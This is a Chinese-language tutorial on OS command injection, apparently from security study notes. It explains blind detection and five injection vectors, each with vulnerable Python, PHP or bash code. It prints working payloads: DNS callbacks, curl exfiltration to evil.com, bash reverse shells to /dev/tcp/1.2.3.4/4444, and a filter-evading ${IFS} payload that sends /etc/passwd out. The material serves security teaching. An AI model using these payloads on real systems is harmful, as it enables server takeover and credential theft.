## 一、OS 命令注入

命令注入也被称为 shell 注入。它允许攻击者在运行应用程序的服务器上执行操作系统（OS）命令，通常可以完全攻陷该应用及其数据。通常情况下，攻击者还可以利用 OS 命令注入漏洞去攻陷托管基础设施的其他部分，并利用系统之间的信任关系，将攻击横向移动（pivot）到组织内部的其他系统。

## 二、盲注：响应里看不到输出怎么办

当注入点存在，但服务器的响应里看不到命令输出。比如你提交了 `product_id=1; whoami`，页面返回的内容和以前一模一样。这时你无法确定：

* 漏洞真的存在？
* 还是我的命令语法错了、被过滤了？

这时要用其他技术确认漏洞存在。

**① 用 DNS/HTTP 回连确认**

```
& nslookup attacker-controlled-domain.com &
```

如果服务器执行了这条命令，它会去对这个域名做一次 DNS 解析，而 DNS 解析必然会查询到攻击者自己的服务器，就能记录到"某某 IP 在某某时刻查询了这个子域名"。

**② 用延时确认**

```
& ping -c 10 127.0.0.1 &
```

`ping -c 10 127.0.0.1` 是对本机发 10 个 ICMP 包，ping 默认每秒发一个，所以整条命令会阻塞约 10 秒才结束。如果你的注入成功：响应时间从平时的 0.1 秒变成 10 秒左右；如果注入失败：响应时间不变。

**③ 把输出重定向到可访问位置**

```
& cat /etc/passwd > /var/www/static/1.txt &
```

物理上是把内容写进了服务器硬盘里的 `/var/www/static/1.txt` 这个文件；而因为你写进了网站根目录，Web 服务器会像对待一张图片一样，把这个文件也当作静态资源对外提供——任何人访问 `http://目标站/1.txt` 就能下载到它的内容。

## 三、注入示例：库存查询功能

在这个例子中，一个购物应用允许用户查看某个商品在特定门店是否有货。该信息通过如下 URL 获取：

```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

为了提供库存信息，应用程序必须查询各种老旧系统（legacy systems）。由于历史原因，这个功能是通过调用一条 shell 命令实现的，商品 ID 和门店 ID 作为参数传入：

```
stockreport.pl 381 29
```

这条命令会输出指定商品的库存状态，并返回给用户。

现在攻击者提交：

```
& echo aiwefwlguh &
```

如果这个输入被提交到 productID 参数，应用程序实际执行的命令就是：

```
stockreport.pl & echo aiwefwlguh & 29
```

`echo` 命令会把提供的字符串原样输出，这是测试某些类型 OS 命令注入的实用方法。`&` 字符是 shell 的命令分隔符。在这个例子里，它使三条独立的命令依次执行。返回给用户的输出是：

```
Error - productID was not provided
aiwefwlguh
29: command not found
```

这三行输出证明了：

* 原本的 `stockreport.pl` 命令在没有收到预期参数的情况下执行了，因此返回了一条错误信息。
* 注入的 `echo` 命令执行了，提供的字符串被回显在输出中。
* 原本的参数 `29` 被当作一条命令执行了，从而产生了一个错误。

在注入的命令后面再加一个 `&` 分隔符很有用，因为它把注入的命令和注入点之后的内容隔离开了，这降低了"后面的内容妨碍注入命令执行"的概率。

> **tips：`;` 和 `&` 的区别**
>
> ```
> 命令A ; 命令B     → A 先跑，shell 等 A 跑完，再跑 B（串行）
> 命令A & 命令B     → A 被扔到后台，shell 不等它，立刻开始跑 B（并行）
> ```

## 四、shell 注入扩展：五种注入途径

除了最开始提到的 URL 查询参数，还有以下几类注入点。

### 1. POST 表单

场景：一个"导出销售报表"功能，用户填写日期范围和文件名，点击导出。

漏洞代码（Python/Flask）：

```python
@app.route("/export", methods=["POST"]) # 声明，访问/export的post请求会让下面的这个函数处理
def export():    
  filename = request.form["filename"]    # 把导出数据压缩成用户命名的文件    
  subprocess.run("zip /tmp/exports/" + filename + ".zip /tmp/data.csv", shell=True)
  ...
```

payload：`filename = report; whoami > /var/www/static/who.txt ;`

解释：

* `request.form["filename"]`：Python Flask 框架里，`request.form` 相当于 PHP 的 `$_POST`——从表单正文取值。
* `subprocess.run(命令字符串, shell=True)`：Python 里执行 shell 命令的函数，对应 PHP 的 `exec`。`shell=True` 表示"把字符串交给 shell 解析执行"；如果写 `shell=False` 并用列表传参，shell 就没有机会解释 `;` 这些字符。
* Python 里 `+` 就是 PHP 的 `.`。

注入过程：把 filename 改成 `report; whoami > /var/www/static/w.txt`，拼出的命令：

```
zip /tmp/exports/report; whoami > /var/www/static/who.txt ;.zip /tmp/data.csv
```

shell 切成三段执行，中间那条把 whoami 结果写进 Web 目录。

### 2. 文件上传的文件名

漏洞代码：

```php
$name = $_FILES['avatar']['name'];
move_uploaded_file($_FILES['avatar']['tmp_name'], "/uploads/" . $name);              
exec("convert /uploads/" . $name . " -resize 100x100 /uploads/thumb_" . $name);   
```

* `move_uploaded_file(临时文件, 目标路径)`：PHP 处理上传的标准动作——把临时文件挪到正式目录。漏洞在于目标文件名用了用户的原始文件名。
* `convert` 是 ImageMagick 图片处理程序的命令。这行代码的意图：给上传的图生成一张 100×100 的缩略图。

注入过程：你上传一个真图片（内容是正常图片都行），但把文件名改成：

```
x.jpg; curl http://evil.com/$(whoami) ;
```

服务器收到后，`$name` 就是这串文字，拼出的命令：

```
convert /uploads/x.jpg; curl http://evil.com/$(whoami) ; -resize 100x100 ...
```

shell 依次执行：`convert`（缩图正常进行）、`curl`（向攻击者的网站发请求，URL 里带着当前用户名）。攻击者在自己的服务器日志里就看到了 `root`。

### 3. HTTP 头

网站在负载均衡（反向代理）后面，程序看到的连接 IP 都是代理自己的，所以真实用户 IP 要从头里读——这是非常常见的架构，也是漏洞的温床。

漏洞代码：

```python
ip = request.headers.get("X-Forwarded-For", request.remote_addr)
if is_rate_limited(ip):    # ← 判断这个IP是否请求太频繁（触发限流才会走到下一行）      
    os.system("iptables -A INPUT -s " + ip + " -j DROP")    
    #      ↑iptables 是 Linux 的防火墙命令    
    #       -A INPUT   在"入站规则链"里追加一条    
    #       -s 某IP    针对来自这个IP的流量    
    #       -j DROP    直接丢弃
```

* `os.system("...")`：执行 shell 命令的 Python 函数，和 `subprocess.run(shell=True)` 一样危险。
* 开发者的逻辑：防火墙封杀攻击者。漏洞在于封禁的目标 IP 来自一个**可伪造的头**。

发起正常请求，但额外加一个头：

```
X-Forwarded-For: 1.2.3.4; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

如果这个 IP 恰好触发了限流（可以疯狂刷请求来触发），服务器拼出：

```
iptables -A INPUT -s 1.2.3.4; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 -j DROP
```

简单来说，这一步会让被攻击者的服务器启动一个 bash 进程。

#### 反弹 shell 的参数解释

`-i` 意味着启动的 bash 是一个可交互程序。

`>& /dev/tcp/1.2.3.4/4444`：此处的 `>&` 和每个 Linux 程序（包括 bash）启动时操作系统自动配好的三条路径——文件描述符（fd）有关：

```
编号 0 = 标准输入  (stdin)  ← 程序从这里"读"数据。终端场景下就是你的键盘
编号 1 = 标准输出  (stdout) ← 程序把正常结果"写"到这里。终端场景下就是屏幕
编号 2 = 标准错误  (stderr) ← 程序把报错信息"写"到这里。默认也在屏幕上
```

shell 的重定向就是把路径配置到某个地方，基本语法是 `编号>目标`：

```
命令 1> file     # 把 fd 1（正常输出）接到 file。注意：1> 可简写成 >
命令 2> file     # 把 fd 2（报错）接到 file
命令 < file      # fd 0（输入）从 file 读（0< 可简写成 <）
```

`>&` 是 `1>&2` 的思想扩展。标准用法：

```
命令 2>&1    # 读作：把 fd 2 接到"fd 1 目前所接的地方"              
            # 2>& 表示"重定向 fd 2"，&1 表示"目标 = fd 1 当前指向的设施"
```

`&` 在这里的含义是：`&` 后面跟的是"编号"而不是"文件名"。没有 `&` 的话，`2>1` 会把报错写进一个名叫 `1` 的文件；`2>&1` 才是"接到 1 号通道去"。

而 `>& 文件` 是 bash 的简写合并形式，意思是：fd 1 接到 file，然后 fd 2 也接到 file 所在的地方，也就是报错和正常输出都会从你设置的这个 file 里看到，也就是设置的 `/dev/tcp/1.2.3.4/4444`。

后面的 `0>&1` 的意思是，把你的输入（也就是 fd 0）和 fd 1 目前所接的地方连接上，三个路径同时接入。

具体流程为：

```
TCP连接 →[0]→ bash     攻击者敲的字，bash 当命令收
bash →[1]→ TCP连接     bash 的结果发回攻击者屏幕
bash →[2]→ TCP连接     bash 的报错也发回攻击者屏幕
```

### 4. Cookie

漏洞代码：

```php
$user = $_COOKIE['username'];//PHP 自动把请求头里的 Cookie 解析成 $_COOKIE 
exec("/opt/scripts/build_cache.sh " . $user);//服务器上脚本，按用户名给该用户生成缓存文件
```

注入过程：用 curl 发请求并塞一个恶意 Cookie：

```
curl "https://目标站/" -H 'Cookie: username="任意; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"'
```

服务器拼出：

```
/opt/scripts/build_cache.sh 任意; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

和例 3 的区别：数据来源从头换成了 Cookie。`username=` 后面故意留空，让原命令"空跑"，`;` 后面接反弹 shell。

> **注意**：`;` 是官方规定的 cookie 分隔符。如 `Cookie: a=1; b=2` 就是两个 cookie。所以 username 里的值需要带上双引号，防止被分割成两个 cookie。

### 5. 二级域名

漏洞脚本（每天在服务器后台定时跑的统计脚本）：

```bash
#!/bin/bash
# 从 Nginx 访问日志里统计每个子域名的访问量
for host in $(grep -oP 'Host: \K[^\s]+' /var/log/nginx/access.log | sort | uniq)
#遍历日志里出现过的每个 Host 值（先 grep 抽出来，排序去重）
do    subdomain=$(echo $host | cut -d. -f1)    
#域名第一段：admin.目标站 → "admin"
    grep $host /var/log/nginx/access.log | wc -l > /stats/$subdomain.count    
    #   统计这个域名在日志里出现多少行          结果写入 /stats/域名首段.count    
    #   $subdomain 没加引号直接拼进 shell
done
```

执行流程：发一个 Host 头为该 payload 的请求 → 只在日志里留下一行记录，当下无事发生 → cron 下次运行脚本 → `$subdomain` 展开成 payload → shell 按 `;` 分段，curl 那段执行 → `/etc/passwd` 内容以 POST 形式到达攻击者服务器。

#### 为什么 payload 要写成 `x;curl${IFS}-d@/etc/passwd${IFS}http://3221225985`

要点：payload 不是直接进 shell 的，中间要穿过两道"剪刀"，所以它不能随便写，必须满足三个约束：

```
①：日志提取（把 Host 值从日志里抠出来）grep -oP 'Host: \K[^\s]+' access.log
    #[^\s]+ = 连续的非空白字符              
    #payload 里不能有空格，否则只截到第一个空格前
②：取域名首段subdomain=$(echo $host | cut -d. -f1)              
    #payload 里不能有点，否则点之后全部截断
③：payload 被展开的位置前后粘着脚本自带的固定内容grep $host .../access.log | wc -l > /stats/$subdomain.count
```

> 补充：payload 里用 `${IFS}` 代替空格（shell 的内部字段分隔符，展开时等效于空格），末尾的 `3221225985` 是十进制 IP 写法，正好绕开"不能出现空格和点"两个约束。
